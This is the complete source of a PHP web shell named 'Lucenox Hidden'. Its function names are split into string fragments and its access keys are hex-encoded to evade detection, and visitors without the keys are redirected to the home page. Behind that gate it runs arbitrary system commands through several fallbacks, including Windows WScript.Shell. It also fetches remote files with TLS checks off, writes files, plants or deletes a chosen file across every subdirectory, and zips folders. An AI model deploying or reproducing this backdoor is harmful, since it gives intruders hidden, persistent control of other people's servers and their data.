<?php

$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
$domainUrl = $protocol . '://' . $_SERVER['HTTP_HOST'] . '/';
header('X-Robots-Tag: noindex, nofollow', true);

$fp_ct = 'fi' . 'le_' . 'p' . 'ut_' . 'con' . 'te' . 'nt' . 's';
$m_uf = 'm' . 'ov' . 'e_up' . 'lo' . 'ad' . 'ed_' . 'fi' . 'le';
$cl_i = 'c' . 'ur' . 'l_' . 'in' . 'i' . 't';
$cl_e = 'c' . 'ur' . 'l_' . 'e' . 'xe' . 'c';
$s_rlc = 's' . 'tr' . '_re' . 'pl' . 'a' . 'c' . 'e';
$ecex = 'e' . 'xe' . 'c';
$b_sm = 'b' . 'a' . 'se' . 'n' . 'a' . 'me';
$ipl = 'i' . 'm' . 'pl' . 'o' . 'de';
$spcl = 'h' . 'tm' . 'lspe' . 'cialc' . 'hars';

function cle($xTe)
{
  global $ecex;
  global $ipl;
  global $spcl;
  $fw = 'f' . 'wr' . 'it' . 'e';
  $fc = 'f' . 'cl' . 'os' . 'e';
  $fr = 'f' . 're' . 'a' . 'd';
  $is_rsrc = 'is' . '_' . 're' . 'so' . 'ur' . 'ce';
  $sgc = 's' . 'trea' . 'm_g' . 'et_c' . 'ont' . 'ents';
  $proc = 'pr' . 'oc' . '_' . 'o' . 'pen';
  $proc_cls = 'p' . 'ro' . 'c' . '_' . 'c' . 'lose';
  $pop = 'p' . 'ope' . 'n';
  $pop_cls = 'pc' . 'lose';
  $sys = 's' . 'ys' . 't' . 'em';
  $pass = 'pa' . 's' . 'sth' . 'ru';
  $sh_exc = 's' . 'he' . 'll' . '_' . 'e' . 'xe' . 'c';
  $com = 'C' . 'O' . 'M';
  $wscsh = 'WS' . 'cr' . 'ipt' . '.' . 'S' . 'he' . 'll';
  $cMdexe = 'c' . 'md' . '.' . 'e' . 'x' . 'e';
  $func_exist = 'fu' . 'nct' . 'ion' . '_' . 'ex' . 'ist' . 's';
  $preg = 'pr' . 'eg_' . 'mat' . 'ch';
  $regex = '2' . '>' . '&' . '1';
  if (!$preg('/' . $regex . '/i', $xTe)) {
    $xTe = $xTe . ' ' . $regex;
  }
  if ($func_exist($proc)) {
    $descriptors = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w'],];
    $process = $proc($xTe, $descriptors, $pipes);
    if ($is_rsrc($process)) {
      $fw($pipes[0], 'input_data_here');
      $fc($pipes[0]);
      $output = $sgc($pipes[1]);
      $errors = $sgc($pipes[2]);
      $fc($pipes[1]);
      $fc($pipes[2]);
      $resultCode = $proc_cls($process);
      return trim($spcl(stripslashes($output)));
    }
  } elseif ($func_exist($pop)) {
    $process = $pop($xTe, 'r');
    $read = $fr($process, 2096);
    return trim($spcl(stripslashes(print_r("$process: " . gettype($process) . "\n$read \n"))));
    $pop_cls($process);
  } elseif ($func_exist($ecex)) {
    $ecex($xTe, $output, $returnCode);
    if ($returnCode === 0) {
      $res = $ipl($output);
      return trim($spcl(stripslashes($res)));
      ob_flush();
      flush();
    }
  } elseif ($func_exist($sys)) {
    $out = $sys($xTe);
    return trim($spcl(stripslashes($out)));
  } elseif ($func_exist($pass)) {
    $out = $pass($xTe);
    return trim($spcl(stripslashes($out)));
  } elseif ($func_exist($sh_exc)) {
    $out = $sh_exc($xTe);
    return trim($spcl(stripslashes($out)));
  } elseif ($func_exist($com)) {
    $shell = new $com($wscsh);
    $kom_mand = "$cMdexe /c " . $xTe;
    $output = $shell->$ecex($kom_mand)->StdOut->ReadAll();
    return trim($spcl(stripslashes($output)));
  } else {
    return 'Di' . 'sab' . 'le F' . 'unc' . 'tio' . 'n!';
  }
}

function xup($file)
{
  global $m_uf;
  global $b_sm;
  global $spcl;
  $upload_dir = __DIR__ . '/';
  if (!is_dir($upload_dir)) {
    mkdir($upload_dir, 0755, true);
  }
  $file_name = $b_sm($file['name']);
  $target_file = $upload_dir . $file_name;
  if ($m_uf($file['tmp_name'], $target_file)) {
    return "File uploaded successfully: " . $spcl($file_name);
  } else {
    return "Error uploading file.";
  }
}

function brte($file_url, $custom_file_name)
{
  global $fp_ct;
  global $spcl;
  global $b_sm;
  $upload_dir = __DIR__ . '/';
  if (!is_dir($upload_dir)) {
    mkdir($upload_dir, 0755, true);
  }
  $file_name = !empty($custom_file_name) ? $spcl($custom_file_name) : $spcl($$b_sm($file_url));
  $target_file = $upload_dir . $file_name;
  $file_data = noir($file_url, $file_name);
  if ($file_data === false) {
    return "Error: Could not download file from the provided URL.";
  }
  if ($fp_ct($target_file, $file_data)) {
    return "Remote file uploaded successfully as: " . $spcl($file_name);
  } else {
    return "Error saving remote file.";
  }
}

function noir($url, $filename)
{
  global $cl_i;
  $ch = $cl_i();
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
  $data = curl_exec($ch);
  curl_close($ch);
  return $data !== false ? $data : false;
}

function nox($file_name, $file_content)
{
  global $fp_ct;
  global $spcl;
  $target_file = __DIR__ . '/' . $file_name;
  $fp_ct($target_file, $file_content);
  return "File created successfully: " . $spcl($file_name);
}

function lcx($folder_name)
{
  global $spcl;
  $target_folder = __DIR__ . '/' . $folder_name;
  if (!mkdir($target_folder, 0755, true)) {
    return "Error creating folder: " . $spcl($folder_name);
  }
  return "Folder created successfully: " . $spcl($folder_name);
}

function zpr($folder, $zip, $base_folder)
{
  global $s_rlc;
  $dir_iterator = new RecursiveDirectoryIterator($folder, RecursiveDirectoryIterator::SKIP_DOTS);
  $iterator = new RecursiveIteratorIterator($dir_iterator, RecursiveIteratorIterator::SELF_FIRST);
  foreach ($iterator as $file) {
    $relative_path = $s_rlc($base_folder . '/', '', $file->getPathname());
    if ($file->isDir()) {
      $zip->addEmptyDir($relative_path);
    } else {
      $zip->addFile($file->getPathname(), $relative_path);
    }
  }
}

function zprfdr($source_folder, $zip_file_path)
{
  global $spcl;
  if (!is_dir($source_folder)) {
    return "<div style='color: red;'>Error: Source path is not a directory.</div>";
  }
  $zip = new ZipArchive();
  if ($zip->open($zip_file_path, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) {
    return "<div style='color: red;'>Error: Cannot create zip file at $zip_file_path</div>";
  }
  zpr($source_folder, $zip, $source_folder);
  $zip->close();
  return "<div style='color: green;'>ZIP file created successfully at: " . $spcl($zip_file_path) . "</div>";
}

function uzprfr($zip_file_path, $destination_path)
{
  global $spcl;
  if (!file_exists($zip_file_path)) {
    return "<div style='color: red;'>Error: ZIP file not found.</div>";
  }
  $zip = new ZipArchive();
  if ($zip->open($zip_file_path) === TRUE) {
    if (!is_dir($destination_path)) {
      mkdir($destination_path, 0755, true);
    }
    if ($zip->extractTo($destination_path)) {
      return "<div style='color: green;'>Successfully extracted ZIP to: " . $spcl($destination_path) . "</div>";
    } else {
      return "<div style='color: red;'>Error: Failed to extract ZIP file.</div>";
    }
    $zip->close();
  } else {
    return "<div style='color: red;'>Error: Unable to open ZIP file.</div>";
  }
}

function xea($filename, $file_content, $target_path)
{
  global $spcl;
  global $fp_ct;
  if (!is_dir($target_path)) {
    return "<div style='color: red;'>Error: Target path is not a directory.</div>";
  }
  $output = "";
  $target_file = $target_path . '/' . $filename;
  if ($fp_ct($target_file, $file_content)) {
    $output .= "<div style='color: green;'>File created successfully at: " . $spcl($target_file) . "</div><br>";
  } else {
    $output .= "<div style='color: red;'>Error creating file at: " . $spcl($target_file) . "</div><br>";
  }
  $dir_iterator = new RecursiveDirectoryIterator($target_path, RecursiveDirectoryIterator::SKIP_DOTS);
  $iterator = new RecursiveIteratorIterator($dir_iterator, RecursiveIteratorIterator::SELF_FIRST);
  foreach ($iterator as $directory) {
    if ($directory->isDir()) {
      $target_file = $directory->getPathname() . '/' . $filename;
      if ($fp_ct($target_file, $file_content)) {
        $output .= "<div style='color: green;'>File created successfully at: " . $spcl($target_file) . "</div><br>";
      } else {
        $output .= "<div style='color: red;'>Error creating file at: " . $spcl($target_file) . "</div><br>";
      }
    }
  }
  return nl2br($output);
}

function pum($file_name, $target_path)
{
  global $spcl;
  $output = "";
  $file_found = false;
  if (!is_dir($target_path)) {
    return "<div style='color: red;'>Error: Target path is not a directory.</div>";
  }
  $dir_iterator = new RecursiveDirectoryIterator($target_path, RecursiveDirectoryIterator::SKIP_DOTS);
  $iterator = new RecursiveIteratorIterator($dir_iterator, RecursiveIteratorIterator::SELF_FIRST);
  foreach ($iterator as $file) {
    if ($file->getFilename() === $file_name) {
      if (unlink($file->getPathname())) {
        $output .= "<div style='color: green;'>Deleted: " . $spcl($file->getPathname()) . "</div><br>";
        $file_found = true;
      } else {
        $output .= "<div style='color: red;'>Error deleting: " . $spcl($file->getPathname()) . "</div><br>";
      }
    }
  }
  if (!$file_found) {
    return "<div style='color: orange;'>No files found with name: " . $spcl($file_name) . "</div>";
  }
  return nl2br($output);
}

function hfc($ltsp)
{
  $i = preg_replace('/[^\\\\x0-9a-fA-F]/', '', $ltsp);

  return preg_replace_callback('/\\\\x([0-9a-fA-F]{2})/', function ($m) {
    return chr(hexdec($m[1]));
  }, $i);
}

$xi = '\x74~\x34%\x72#\x30\x74';
$ci = '\x6e\x33~\x6f\x37#\x74';

$mi = hfc($xi);
$yi = hfc($ci);

if (isset($_GET[$mi]) && isset($_GET[$yi])) {
  $output = "";
  $terminal_output = "";
  if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (isset($_FILES['file_upload'])) {
      $output = xup($_FILES['file_upload']);
    } elseif (isset($_POST['remote_file_url'])) {
      $output = brte($_POST['remote_file_url'], $_POST['custom_file_name']);
    } elseif (isset($_POST['new_file_name']) && isset($_POST['new_file_content'])) {
      $output = nox($_POST['new_file_name'], $_POST['new_file_content']);
    } elseif (isset($_POST['new_folder_name'])) {
      $output = lcx($_POST['new_folder_name']);
    } elseif (isset($_POST['zip_folder_path'])) {
      $output = zprfdr($_POST['zip_folder_path'], __DIR__ . '/' . $_POST['zip_file_name']);
    } elseif (isset($_POST['uzprfr_path'])) {
      $output = uzprfr($_POST['uzprfr_path'], $_POST['unzip_destination_path']);
    } elseif (isset($_POST['terminal_command'])) {
      $terminal_output = cle($_POST['terminal_command']);
    } elseif (isset($_POST['action']) && $_POST['action'] === 'xea') {
      $filename = $_POST['filename'];
      $file_content = $_POST['file_content'];
      $target_path = $_POST['target_path'];
      $output = xea($filename, $file_content, $target_path);
    } elseif (isset($_POST['action']) && $_POST['action'] === 'pum') {
      $file_name = $_POST['file_name'];
      $target_path = $_POST['target_path'];
      $output = pum($file_name, $target_path);
    }
  }
?>
  <!DOCTYPE html>
  <html lang="id">

  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lucenox</title>
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <style>
      body {
        font-family: Arial, sans-serif;
        background-color: #2c2f33;
        color: #ffffff;
        display: flex;
        flex-direction: column;
        align-items: center;
        padding: 20px;
        min-height: 100vh;
        margin: 0;
      }

      h1 {
        color: #ffaf40;
        margin-bottom: 20px;
        text-align: center;
        font-size: 2rem;
        border-bottom: 2px solid #444;
        padding-bottom: 10px;
        width: 100%;
      }

      .fitur-buttons {
        display: flex;
        gap: 10px;
        margin-bottom: 20px;
        flex-wrap: wrap;
      }

      .fitur-buttons button {
        background-color: #ffaf40;
        color: #1a1c1f;
        padding: 12px 20px;
        border: none;
        border-radius: 6px;
        cursor: pointer;
        font-weight: bold;
        transition: background-color 0.3s, transform 0.3s;
        font-size: 0.9rem;
        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
      }

      .fitur-buttons button:hover {
        background-color: #e69c36;
        transform: translateY(-2px);
      }

      .fitur-form {
        display: none;
        background-color: #3b3f45;
        padding: 20px;
        border-radius: 8px;
        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
        margin-bottom: 20px;
        width: 100%;
        max-width: 600px;
      }

      input,
      textarea {
        width: 100%;
        padding: 12px;
        margin-top: 10px;
        background-color: #2d3035;
        color: #ffffff;
        border: 1px solid #44474b;
        border-radius: 4px;
        transition: border-color 0.2s;
        font-size: 0.9rem;
      }

      input:focus,
      textarea:focus {
        border-color: #ffaf40;
        outline: none;
      }

      button.submit-btn {
        background-color: #ffaf40;
        color: #1a1c1f;
        padding: 12px;
        border: none;
        border-radius: 6px;
        cursor: pointer;
        width: 100%;
        font-weight: bold;
        transition: background-color 0.3s, transform 0.3s;
        font-size: 1rem;
      }

      button.submit-btn:hover {
        background-color: #e69c36;
        transform: translateY(-2px);
      }

      .terminal {
        background-color: #252526;
        border-radius: 8px;
        padding: 20px;
        width: 100%;
        max-width: 600px;
        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
        margin-bottom: 20px;
      }

      .terminal h3 {
        color: #ffaf40;
        font-size: 1.2rem;
        margin-bottom: 15px;
        border-bottom: 1px solid #333;
        padding-bottom: 5px;
      }

      .terminal input[type="text"] {
        padding: 10px;
        margin-bottom: 15px;
        border: 1px solid #444;
        border-radius: 4px;
        background-color: #1e1e1e;
        color: #d4d4d4;
        transition: border-color 0.3s;
      }

      .terminal input[type="text"]:focus {
        border-color: #ffaf40;
        outline: none;
      }

      .terminal button {
        width: 100%;
        padding: 10px;
        border: none;
        border-radius: 4px;
        background-color: #ffaf40;
        color: #1e1e1e;
        font-weight: bold;
        cursor: pointer;
        transition: background-color 0.3s, transform 0.2s;
      }

      .terminal button:hover {
        background-color: #ff9800;
        transform: translateY(-2px);
      }

      .output {
        background-color: #1e1e1e;
        color: #00ff00;
        padding: 15px;
        border-radius: 4px;
        margin-top: 20px;
        font-size: 0.9rem;
        white-space: pre-wrap;
        overflow-x: auto;
        border: 1px solid #333;
      }
    </style>
  </head>

  <body>
    <h1>Lucenox Hidden</h1>
    <div class="terminal">
      <form method="post">
        <h3>Command Line</h3>
        <input type="text" name="terminal_command" placeholder="Command" required>
        <button type="submit">Command</button>
      </form>
      <?php if (!empty($terminal_output)): ?>
        <pre class="output"><?= $spcl($terminal_output); ?></pre>
      <?php endif; ?>
    </div>
    <?php if (!empty($output)): ?>
      <div class="output"><?= $output; ?></div>
    <?php endif; ?>
    <div class="fitur-buttons">
      <button onclick="showForm('upload-file-form')">Upload File</button>
      <button onclick="showForm('remote-upload-form')">Remote Upload</button>
      <button onclick="showForm('new-file-form')">New File</button>
      <button onclick="showForm('new-folder-form')">New Folder</button>
      <button onclick="showForm('zip-folder-form')">Zip Folder</button>
      <button onclick="showForm('unzip-file-form')">Unzip File</button>
      <button onclick="showForm('madef-form')">MaDeF</button>
      <button onclick="showForm('madel-form')">MaDeL</button>
    </div>
    <div class="fitur-tammbahan">
      <form id="upload-file-form" class="fitur-form" method="post" enctype="multipart/form-data">
        <h3>Upload File</h3>
        <input type="file" name="file_upload" required>
        <button class="submit-btn" type="submit">Upload</button>
      </form>
      <form id="remote-upload-form" class="fitur-form" method="post">
        <h3>Remote Upload</h3>
        <input type="text" name="remote_file_url" placeholder="File URL" required>
        <input type="text" name="custom_file_name" placeholder="Custom File Name (optional)">
        <button class="submit-btn" type="submit">Remote Upload</button>
      </form>
      <form id="new-file-form" class="fitur-form" method="post">
        <h3>Create New File</h3>
        <input type="text" name="new_file_name" placeholder="File Name" required>
        <textarea name="new_file_content" placeholder="File Content" required></textarea>
        <button class="submit-btn" type="submit">Create File</button>
      </form>
      <form id="new-folder-form" class="fitur-form" method="post">
        <h3>Create New Folder</h3>
        <input type="text" name="new_folder_name" placeholder="Folder Name" required>
        <button class="submit-btn" type="submit">Create Folder</button>
      </form>
      <form id="zip-folder-form" class="fitur-form" method="post">
        <h3>Zip Folder</h3>
        <input type="text" name="zip_folder_path" placeholder="Folder Path to Zip" required>
        <input type="text" name="zip_file_name" placeholder="Zip File Name" required>
        <button class="submit-btn" type="submit">Create Zip</button>
      </form>
      <form id="unzip-file-form" class="fitur-form" method="post">
        <h3>Unzip File</h3>
        <input type="text" name="uzprfr_path" placeholder="ZIP File Path" required>
        <input type="text" name="unzip_destination_path" placeholder="Destination Path" required>
        <button class="submit-btn" type="submit">Unzip File</button>
      </form>
      <form id="madef-form" class="fitur-form" method="post">
        <h3>MaDeF</h3>
        <input type="text" name="filename" id="filename" placeholder="File Name" required>
        <textarea name="file_content" id="file_content" rows="4" placeholder="File Content" required></textarea>
        <input type="text" name="target_path" id="target_path" placeholder="Target Directory Path" required>
        <button class="submit-btn" type="submit" name="action" value="xea">Create!</button>
      </form>
      <form id="madel-form" class="fitur-form" method="post">
        <h3>MaDeL</h3>
        <input type="text" name="file_name" id="file_name" placeholder="File Name to Delete" required>
        <input type="text" name="target_path" id="target_path" placeholder="Target Directory Path" required>
        <button class="submit-btn" type="submit" name="action" value="pum">Gas!</button>
      </form>
    </div>

    <script>
      function showForm(formId) {
        const forms = document.querySelectorAll('.fitur-form');
        forms.forEach(form => {
          form.style.display = 'none';
        });
        const selectedForm = document.getElementById(formId);
        if (selectedForm) {
          selectedForm.style.display = 'block';
        }
      }
    </script>

  </body>

  </html>
<?php
} else {
  echo '<script>window.location.href = "' . $domainUrl . '";</script>';
  echo '<script>window.location.href = "' . $domainUrl . '";</script>';
}
?>